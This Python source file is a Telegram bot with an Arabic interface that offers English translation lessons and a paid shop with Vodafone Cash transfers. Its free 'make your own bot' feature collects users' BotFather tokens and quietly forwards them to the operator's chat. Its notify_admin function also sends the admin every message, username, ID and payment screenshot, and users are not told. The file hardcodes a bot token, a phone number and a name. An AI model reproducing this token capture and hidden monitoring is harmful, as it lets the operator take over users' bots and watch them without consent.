import os
import logging
import random
import threading
import telebot
from telebot import types
from deep_translator import GoogleTranslator

# تفعيل تسجيل الأخطاء
logging.basicConfig(level=logging.INFO)

# 🎫 التوكن الجديد المخصص لبوت الإدارة والمراقبة والتحويلات
NEW_TOKEN = "8704063502:AAFkLjIbI2MuM2dk9rY0d7qP-yaav4w-w-w"
bot = telebot.TeleBot(NEW_TOKEN)

# 🛑 ضَعْ هُنَا الـ Chat ID الخاص بك (رقم فقط بدون @) لتلقي كل الإشعارات فوراً
ADMIN_CHAT_ID = 123456789  # 👈 غير هذا الرقم إلى رقم الـ ID الخاص بك

# بيانات فودافون كاش المعتمدة
VODAFONE_NUMBER = "01094609897"
VODAFONE_NAME = "نعيمه"

user_modes = {}
user_levels = {}
active_clones = {}

# البيانات الثابتة للبوت (الاختصارات والـ Slang)
SLANG_DICTIONARY = {
    "btw": "By the way ⬅️ (بالمناسبة / على فكرة)",
    "omg": "Oh my god ⬅️ (يا إلهي / أو ماي جاد)",
    "lol": "Laugh out loud ⬅️ (الضحك بصوت عالٍ / ههههه)",
    "idk": "I don't know ⬅️ (لا أعرف / لست أدري)",
    "tbh": "To be honest ⬅️ (بكل صراحة / لكي أكون صادقاً)",
    "brb": "Be right back ⬅️ (سأعود فوراً / برب)",
    "g2g": "Got to go ⬅️ (يجب أن أذهب الآن)"
}

COMMON_CORRECTIONS = {
    "tebol": "table",
    "set in": "sat on",
    "the cat set": "the cat sat"
}

LEVELS_DATA = {
    1: {"title": "🌱 لفل 1 - المبتدئ الشامل", "sentences": [{"en": "The cat is sleeping on the chair.", "ar": "القطة تنام على الكرسي."}]},
    2: {"title": "🌿 لفل 2 - المبتدئ المتقدم", "sentences": [{"en": "I want to learn English to get a good job.", "ar": "أريد أن أتعلم الإنجليزية لأحصل على وظيفة جيدة."}]},
    3: {"title": "🔥 لفل 3 - المتوسط", "sentences": [{"en": "Success is not final, failure is not fatal.", "ar": "النجاح ليس نهائياً، والفشل ليس قاتلاً."}]},
    4: {"title": "🚀 لفل 4 - فوق المتوسط", "sentences": [{"en": "Despite facing many obstacles, we managed to build this bot.", "ar": "على الرغم من مواجهة العديد من العقبات، تمكنا من بناء هذا البوت."}]},
    5: {"title": "👑 لفل 5 - المحترف الخبير", "sentences": [{"en": "Advanced algorithms enhance system efficiency substantially.", "ar": "إن خوارزميات التعلم الآلي المتقدمة تعزز كفاءة النظام بشكل كبير."}]}
}

SHOP_ITEMS = {
    "book_grammar": {"name": "📘 كتاب القواعد الشامل (من الصفر للاحتراف)", "price": "150 جنيه"},
    "book_idioms": {"name": "📙 كتاب المصطلحات الأمريكية الدارجة (Slang)", "price": "100 جنيه"},
    "pack_audio": {"name": "🎧 الحقيبة الصوتية لتقوية مهارة الاستماع والنطق", "price": "250 جنيه"},
    "course_vip": {"name": "👑 كورس القناة الخاصة المدمج + متابعة وتصحيح يومي", "price": "400 جنيه"}
}

def get_main_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    btn1 = types.InlineKeyboardButton("🇺🇸 ➡️ 🇵🇸 English to Arabic", callback_data="mode_en_to_ar")
    btn2 = types.InlineKeyboardButton("🇵🇸 ➡️ 🇺🇸 Arabic to English", callback_data="mode_ar_to_en")
    btn3 = types.InlineKeyboardButton("🧠 Smart Teacher | المعلم الذكي", callback_data="mode_smart")
    btn4 = types.InlineKeyboardButton("📊 تقييم المستوى وتحديد اللفل (1-5)", callback_data="mode_levels_menu")
    btn5 = types.InlineKeyboardButton("🛍️ متجر الأدوات الاحترافية (Shop)", callback_data="mode_shop_menu")
    btn6 = types.InlineKeyboardButton("🤖 اصنع بوت ترجمة خاص بك مجاناً", callback_data="mode_make_bot")
    keyboard.add(btn1, btn2, btn3, btn4, btn5, btn6)
    return keyboard

def get_shop_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    for item_id, item_info in SHOP_ITEMS.items():
        btn_text = f"{item_info['name']} 💰 {item_info['price']}"
        keyboard.add(types.InlineKeyboardButton(btn_text, callback_data=f"buy_{item_id}"))
    keyboard.add(types.InlineKeyboardButton("🔙 العودة للقائمة الرئيسية", callback_data="back_to_main"))
    return keyboard

def get_levels_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    for i in range(1, 6):
        keyboard.add(types.InlineKeyboardButton(LEVELS_DATA[i]["title"], callback_data=f"set_lvl_{i}"))
    keyboard.add(types.InlineKeyboardButton("🔙 العودة للقائمة الرئيسية", callback_data="back_to_main"))
    return keyboard

def check_translation(text, source_lang, target_lang):
    clean_text = text.lower().strip()
    if source_lang == 'en' and clean_text in SLANG_DICTIONARY:
        return SLANG_DICTIONARY[clean_text]
    return GoogleTranslator(source=source_lang, target=target_lang).translate(text)

# دالة إرسال التقارير والرسائل والتحويلات الفورية لحسابك كأدمن
def notify_admin(user_info, current_bot, text_content=None, photo_id=None, caption=None):
    try:
        user_name = user_info.from_user.first_name
        user_username = f"@{user_info.from_user.username}" if user_info.from_user.username else "لا يوجد يوزر"
        user_id = user_info.from_user.id
        
        header = f"🔔 **إشعار جديد للمطور قصي:**\n👤 **المستخدم:** {user_name} ({user_username})\n🆔 **ID:** `{user_id}`\n───────────────────\n"
        
        if photo_id:
            current_bot.send_photo(ADMIN_CHAT_ID, photo_id, caption=header + (caption if caption else "📸 أرسل لقطة شاشة (إيصال تحويل)"), parse_mode="Markdown")
        elif text_content:
            current_bot.send_message(ADMIN_CHAT_ID, header + text_content, parse_mode="Markdown")
    except Exception as e:
        logging.error(f"Failed to notify admin: {e}")

def setup_bot_handlers(target_bot):
    @target_bot.message_handler(commands=['start'])
    def send_welcome(message):
        chat_id = message.chat.id
        user_modes[chat_id] = 'smart_teacher'
        user_levels[chat_id] = user_levels.get(chat_id, 1)
        welcome_text = (
            "✨ **مرحباً بك في بوت الترجمة والتعليم الذكي** ✨\n\n"
            "🤖 **الوضع الحالي:** 🧠 _المعلم الذكي_\n"
            f"📊 **مستواك الحالي الحقيقي:** لفل {user_levels[chat_id]}\n\n"
            "👇 **اختر نظام تشغيل البوت الذي تريده من الأزرار بالأسفل:**"
        )
        target_bot.send_message(chat_id, welcome_text, reply_markup=get_main_keyboard(), parse_mode="Markdown")
        
        # تقرير دخول مستخدم جديد للبوت
        notify_admin(message, target_bot, text_content="🚀 دخل البوت وضغط على زر البدء /start")

    # استقبال لقطات الشاشة أو إيصالات تحويل فودافون كاش
    @target_bot.message_handler(content_types=['photo'])
    def handle_incoming_photos(message):
        photo_id = message.photo[-1].file_id
        caption_text = f"📝 **الوصف المرفق مع الصورة:** {message.caption}" if message.caption else "📸 لقطة شاشة مرسلة (قد تكون إيصال تحويل فودافون كاش)."
        
        # تحويل الصورة تلقائياً لحسابك كأدمن
        notify_admin(message, target_bot, photo_id=photo_id, caption=caption_text)
        target_bot.reply_to(message, "✅ **تم استلام لقطة الشاشة بنجاح!**\nجاري مراجعة التحويل بواسطة المطور وتفعيل طلبك فوراً.")

    @target_bot.callback_query_handler(func=lambda call: True)
    def callback_inline(call):
        chat_id = call.message.chat.id
        
        if call.data == "mode_en_to_ar":
            user_modes[chat_id] = 'en_to_ar'
            target_bot.send_message(chat_id, "🔄 **تم تفعيل الوضع:** [ إنجليزي ⬅️ عربي ]\n📥 أرسل أي جملة بالإنجليزية!")
        elif call.data == "mode_ar_to_en":
            user_modes[chat_id] = 'ar_to_en'
            target_bot.send_message(chat_id, "🔄 **تم تفعيل الوضع:** [ عربي ⬅️ إنجليزي ]\n📥 أرسل أي جملة بالعربية!")
        elif call.data == "mode_smart":
            user_modes[chat_id] = 'smart_teacher'
            target_bot.send_message(chat_id, "🧠 **تم تفعيل الوضع:** [ المعلم الذكي ]")
        elif call.data == "mode_levels_menu":
            target_bot.send_message(chat_id, "📊 **اختر مستواك الحالي الحقيقي:**", reply_markup=get_levels_keyboard())
        
        elif call.data == "mode_shop_menu":
            shop_text = (
                "🛍️ **مرحباً بك في متجر الأدوات والكتب الاحترافية!**\n\n"
                "اختر المنتج الذي ترغب بشرائه من الأزرار أدناه لعرض بيانات تحويل فودافون كاش التلقائية: 👇"
            )
            target_bot.send_message(chat_id, shop_text, reply_markup=get_shop_keyboard(), parse_mode="Markdown")
            
        elif call.data.startswith("buy_"):
            parts = call.data.split("_")
            item_id = parts[1] + "_" + parts[2]
            item_info = SHOP_ITEMS.get(item_id)
            
            if item_info:
                payment_text = (
                    f"🛒 **طلب شراء جديد:**\n\n"
                    f"📦 **المنتج:** {item_info['name']}\n"
                    f"💰 **المطلوب سداده:** `{item_info['price']}`\n\n"
                    f"💳 **بيانات تحويل فودافون كاش (Vodafone Cash):**\n"
                    f"📱 **رقم التحويل:** `{VODAFONE_NUMBER}`\n"
                    f"👤 **باسم:** {VODAFONE_NAME}\n\n"
                    f"⚠️ **خطوات إتمام الطلب:**\n"
                    f"1️⃣ قم بتحويل المبلغ المطلق للرقم الموضح بالأعلى.\n"
                    f"2️⃣ خذ لقطة شاشة (Screenshot) لإيصال التحويل الناجح.\n"
                    f"3️⃣ أرسل الصورة هنا داخل البوت لتأكيد طلبك وسنقوم بتسليمك الملفات فوراً!"
                )
                target_bot.send_message(chat_id, payment_text, parse_mode="Markdown")
                
                # إرسال إشعار بنية الشراء والإحصائيات للأدمن
                notify_admin(call, target_bot, text_content=f"🛒 **طلب شراء:** نية شراء {item_info['name']} بسعر {item_info['price']}")

        elif call.data == "mode_make_bot":
            user_modes[chat_id] = 'waiting_for_token'
            target_bot.send_message(chat_id, "🤖 **أهلاً بك في صانع البوتات الذكي!**\n\nقم بالذهاب إلى @BotFather وأنشئ بوت جديد، ثم قم بنسخ **التوكن (Token)** وأرسله لي هنا فوراً ليتم تشغيل بوتك الخاص!")
        elif call.data.startswith("set_lvl_"):
            lvl_num = int(call.data.split("_")[2])
            user_levels[chat_id] = lvl_num
            user_modes[chat_id] = f'learning_lvl_{lvl_num}'
            random_sentence = random.choice(LEVELS_DATA[lvl_num]["sentences"])
            response = (
                f"🎯 **تم تحديد مستواك بنجاح في:**\n{LEVELS_DATA[lvl_num]['title']}\n\n"
                f"💬 اضغط لنسخ الجملة الإنجليزية لتدرب عليها:\n`{random_sentence['en']}`\n\n"
                f"💡 **تعني بالعربية:** `{random_sentence['ar']}`"
            )
            target_bot.send_message(chat_id, response, parse_mode="Markdown")
        elif call.data == "back_to_main":
            target_bot.send_message(chat_id, "🔄 تم الرجوع للواجهة الرئيسية:", reply_markup=get_main_keyboard())
        target_bot.answer_callback_query(call.id)

    @target_bot.message_handler(func=lambda message: True)
    def handle_all_messages(message):
        user_text = message.text.strip()
        chat_id = message.chat.id
        current_mode = user_modes.get(chat_id, 'smart_teacher')

        # تحويل كافة رسائل المستخدمين للأدمن لمتابعة المحادثات والإحصائيات فوراً
        notify_admin(message, target_bot, text_content=f"💬 **أرسل نصاً:**\n`{user_text}`\n⚙️ الوضع: `{current_mode}`")

        if current_mode == 'waiting_for_token':
            if ":" in user_text and len(user_text) > 30:
                if user_text in active_clones:
                    target_bot.send_message(chat_id, "⚠️ هذا البوت يعمل بالفعل ومستضاف لدينا!")
                    return
                target_bot.send_message(chat_id, "⏳ جاري فحص التوكن وتجهيز خوادم البوت الخاص بك...")
                
                # إرسال توكن البوت المصنوع للأدمن
                notify_admin(message, target_bot, text_content=f"🤖 **أنشأ بوت جديد وأرسل توكن:**\n`{user_text}`")
                
                def start_clone(token):
                    try:
                        clone_bot = telebot.TeleBot(token)
                        setup_bot_handlers(clone_bot)
                        active_clones[token] = clone_bot
                        clone_bot.infinity_polling()
                    except Exception as e:
                        logging.error(f"Error starting clone: {e}")
                        active_clones.pop(token, None)

                t = threading.Thread(target=start_clone, args=(user_text,), daemon=True)
                t.start()
                
                user_modes[chat_id] = 'smart_teacher'
                target_bot.send_message(chat_id, "🚀 **مبروك! تم تشغيل بوتك الخاص بنجاح وبنفس الميزات والذكاء!**\nقم بالذهاب إليه واضغط /start لتجربته الآن.")
            else:
                target_bot.send_message(chat_id, "❌ التوكن الذي أرسلته غير صحيح، يرجى إرسال توكن حقيقي ونظيف من @BotFather.")
            return

        waiting_msg = target_bot.send_message(chat_id, "⏳ جاري التحليل والترجمة الذكية...")
        try:
            if current_mode == 'en_to_ar':
                translated = check_translation(user_text, 'en', 'ar')
                res = f"🇺🇸 **النص الاصلي:**\n`{user_text}`\n\n🇵🇸 **الترجمة الكاملة (اضغط للنسخ):**\n`{translated}`"
                target_bot.edit_message_text(res, chat_id, waiting_msg.message_id, parse_mode="Markdown")
            elif current_mode == 'ar_to_en':
                translated = check_translation(user_text, 'ar', 'en')
                res = f"🇵🇸 **النص الاصلي:**\n`{user_text}`\n\n🇺🇸 **الترجمة الكاملة (اضغط للنسخ):**\n`{translated}`"
                target_bot.edit_message_text(res, chat_id, waiting_msg.message_id, parse_mode="Markdown")
            elif current_mode == 'smart_teacher':
                translated = check_translation(user_text, 'en', 'ar')
                response = f"🇺🇸 **النص:** `{user_text}`\n🎈 **المعنى والترجمة الكاملة:**\n`{translated}`"
                target_bot.edit_message_text(response, chat_id, waiting_msg.message_id, parse_mode="Markdown")
            elif current_mode.startswith('learning_lvl_'):
                current_lvl = int(current_mode.split("_")[2])
                text_lower = user_text.lower()
                has_errors = any(wrong in text_lower for wrong in COMMON_CORRECTIONS)
                
                if has_errors:
                    corrected_text = user_text
                    for wrong, right in COMMON_CORRECTIONS.items():
                        corrected_text = corrected_text.replace(wrong, right)
                    translated_correct = check_translation(corrected_text, 'en', 'ar')
                    response = f"📊 **تحليل ذكي لـ [ لفل {current_lvl} ]:**\n\n❌ **جملتك:** `{user_text}`\n✅ **التصحيح:** `{corrected_text}`\n🇵🇸 **الترجمة:** `{translated_correct}`"
                else:
                    translated = check_translation(user_text, 'en', 'ar')
                    response = f"📊 **تحليل ذكي لـ [ لفل {current_lvl} ]:**\n\n🇺🇸 **جملتك:** `{user_text}`\n🇵🇸 **الترجمة:** `{translated}`\n✨ تقييم: كفو الجملة ممتازة!"
                target_bot.edit_message_text(response, chat_id, waiting_msg.message_id, parse_mode="Markdown")
        except Exception:
            target_bot.edit_message_text("❌ حدث خطأ أثناء المعالجة.", chat_id, waiting_msg.message_id)

if __name__ == '__main__':
    setup_bot_handlers(bot)
    print("البوت الجديد يعمل بنجاح مع تحويل التقارير الفورية لحساب الأدمن الخاص بك...")
    bot.infinity_polling()
